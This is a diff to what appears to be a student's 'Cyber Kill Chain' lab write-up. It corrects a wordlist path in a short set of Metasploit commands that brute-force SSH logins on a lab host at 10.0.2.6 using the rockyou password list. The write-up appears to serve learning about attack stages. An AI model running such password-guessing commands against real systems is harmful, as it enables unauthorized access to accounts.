@@ -91,7 +91,7 @@ The objective of the “Cyber Kill Chain” project is to deepen my understandin
   use auxiliary/scanner/ssh/ssh_login
   set rhosts 10.0.2.6
   set username chewbacca
-  set pass_file /user/share/wordlists/rockyou.txt
+  set pass_file /usr/share/wordlists/rockyou.txt
   set verbose true
   set threads 16
   set stop_on_success true
